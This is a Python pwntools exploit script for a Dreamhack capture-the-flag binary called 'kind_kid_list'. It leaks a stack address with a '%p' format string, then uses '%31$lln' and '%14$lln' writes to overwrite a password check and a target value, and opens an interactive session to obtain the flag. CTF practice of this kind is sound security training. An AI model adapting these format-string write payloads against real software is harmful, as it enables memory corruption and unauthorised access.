#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./kind_kid_list_patched', checksec=False)
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

gs = """
decompiler connect ida --host 172.19.176.1 --port 3662
b *main
b *main+574
b *main+740
b *main+816
b *main+691
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 15360)
    else:
        return process(elf.path)

io = start()
password = b'\x01' + b'\x00' * 7
sla(b'>> ', b'2')
sla(b'Password : ', b'%p')
stack = int(io.recvn(14), 16) - 0x1fc10
dest = stack + 0x1fc30
success(f"stack @ {hex(stack)}")
success(f"target @ {hex(dest)}")

#change password
sla(b'>> ', b'2')
sla(b'Password : ', b'|%31$lln')    #write 1 to password
sla(b'>> ', b'2')
sla(b'Password : ', password)
sla(b'Name : ', b'wyv3rn')

sla(b'>> ', b'2')
sla(b'Password : ', password)
sla(b'Name : ', pack(dest))

#change dest
sla(b'>> ', b'2')
sla(b'Password : ', b'|%14$lln')

#get flag
sla(b'>> ', b'3')
io.interactive()

